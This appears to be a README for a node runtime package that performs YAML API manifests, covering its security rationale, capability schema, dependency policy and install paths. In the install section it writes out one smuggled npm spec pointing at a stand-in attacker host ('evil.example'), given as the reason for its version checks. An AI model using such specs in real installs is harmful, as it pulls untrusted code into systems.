# @unoverse-platform/base

The node runtime. Everything needed to **run** a node, split out so a box that only runs
nodes doesn't need the whole server.

```
src/manifests/   YAML nodes: reading them, and performing them
src/template/    the expression sandbox, and Handlebars
src/platform/    what a node can see: execution context, redis, the plugin API
src/plugins/     finding, installing and loading node packages
```

## Why this package exists

A node used to be a TypeScript package installed from npm into a running universe. That
worked, and it cost three things.

### Security

Installed code can do anything the process can. Read the environment, open a socket, post a
credential somewhere. Nothing about "it came from npm" prevents that, so the only real
control was trusting whoever published it.

A YAML node cannot execute. There is no code in it to run, which means the question changes
from *do we trust the author* to *what is this allowed to reach*. That question has an
answer written down: `allowedHosts` in the node's `package.yaml` names every host it may
call, and the runtime refuses the rest.

So a node from someone you have never met is safe to accept, because the worst it can do is
call a host it declared in writing.

### Flexibility

One runtime serves every vendor. Adding an integration means writing YAML, not publishing a
package, so a universe can gain a node without a release, a build or a deploy.

Capabilities compound. AWS request signing was written once, in about 200 lines; DynamoDB,
S3 and Bedrock followed as YAML, and Textract and Comprehend now need nothing new at all.
Every node written afterwards inherits retries, pagination, batching and job polling for
free, because they live here rather than in each node.

### Speed

No SDK weight, no install step, no per-node build. A node is text that is read and
performed. Two AWS packages that were 2,700 lines of TypeScript across four SDK clients are
now 1,150 lines of YAML over 200 lines of shared code.

### The rule that holds it together

**YAML can only name capabilities that already exist here.** It can say "sign this with AWS
SigV4" because that is implemented. It cannot say "run this code", because there is nowhere
to put code. `nodes/_schema/api.schema.json` is the list, and a test fails if anything in it
has no implementation, so the two cannot drift apart.

## How a node works

A node used to be a TypeScript package published to npm. Now it's YAML describing an API
call, and the code in here makes that call.

```yaml
- name: query
  method: POST
  url: "return 'https://dynamodb.' + credentials.awsCredential.region + '.amazonaws.com/'"
  auth: { scheme: awsSigV4, service: dynamodb }
  headers: { X-Amz-Target: DynamoDB_20120810.Query }
  transport: json
  encoding: dynamodbJson
```

Every one of those keys names something implemented here. `awsSigV4` signs the request,
`json` reads the reply, `dynamodbJson` converts values to DynamoDB's type tags.

**YAML can only name what already exists.** There's nowhere to put code, which is what makes
a manifest safe to accept from someone else.

## Capabilities

`nodes/_schema/api.schema.json` is the list. A test walks every value in it and fails if
anything has no implementation here, so the schema can't drift ahead of the code.

| | |
|---|---|
| **auth** | `bearer` `basic` `apiKeyHeader` `apiKeyQuery` `oauth2ClientCredentials` `awsSigV4` |
| **transport** | `json` `text` `xml` `headers` `binary` `sse` |
| **encoding** | `dynamodbJson` `binary` |
| **loops** | `paginate` (cursor / page / offset), `chunk`, `poll` |
| **other** | `state`, `presign`, `toolExchange`, `narrate` |

Adding one means implementing it here first, then adding the value to the schema.

## Adding a dependency

One question: **does it make requests for a particular vendor?**

| | example | verdict |
|---|---|---|
| generic algorithm or format | `@smithy/signature-v4`, `fast-xml-parser`, `@aws-sdk/util-dynamodb` | fine |
| vendor client | `@openai/agents`, `@aws-sdk/client-dynamodb`, `@pinecone-database/pinecone` | no |

A vendor client can't help anyway. This package is one piece of code serving every node, so
a DynamoDB client is useless to a Textract manifest. You'd need one per vendor, plus a
branch to choose between them, which is the adapter-per-vendor pattern manifests replaced.

For scale: `src/manifests/runtime/aws.ts` is 221 lines and covers signing, presigning and
type tags for **all** of AWS. It replaced four SDK clients and about 2,700 lines of
TypeScript across two node packages.

Two cases that come up:

- **`@aws-sdk/util-dynamodb`** has a vendor's name and still belongs. It makes no calls and
  holds no client. It's a data format, like XML, that one vendor happened to invent. It also
  can't move into YAML, because the conversion recurses and the sandbox has no way to define
  a function that calls itself.
- **The OpenAI Agents SDK** was deliberately removed. What it gives you is a loop, not a
  capability, and `OpenAIAgent` runs that loop from `api/toolExchange.yaml`. Adding it back
  recreates the drift where each model family hand-wires its own harness.

## Installing: two paths

**Manifests are data.** Install writes a database row and flips a flag. No npm, no download,
nothing runs. Developers can publish manifests freely because YAML can't execute. What
bounds one is `allowedHosts` in its `package.yaml`, so it can only call hosts someone
approved in writing.

**Code packages are code.** Install runs `npm install`, which can execute, so it's bounded
by provenance in `src/plugins/install.ts`:

- the **scope** must be `@unoverse-platform/`
- the **version** must really be a version. npm reads `name@spec`, where the spec may be a
  URL, git ref or file path, so `@unoverse-platform/x@https://evil.example/p.tgz` would pass
  a name-only check and install code from anywhere.
- **`execFile`, not `exec`**, so arguments never reach a shell

Code packages are legacy and shrinking. Manifests are the direction.

## Notes

- `primeTemplating()` is a no-op kept for its callers. It used to await a dynamic import.
- `src/template/` holds the security boundary. `SafeExpression` is the sandbox every
  expression runs in, and the Handlebars resolver registers the helpers manifests use
  (`eq`, `toJSON`, `filter`, `contains`). Neither may be replaced with a direct call to
  Handlebars or a hand-rolled evaluator.
- Nothing here may import by source URL. A path in a string can't be type-checked, so it
  breaks at run time while the build stays green. There's a test enforcing it.
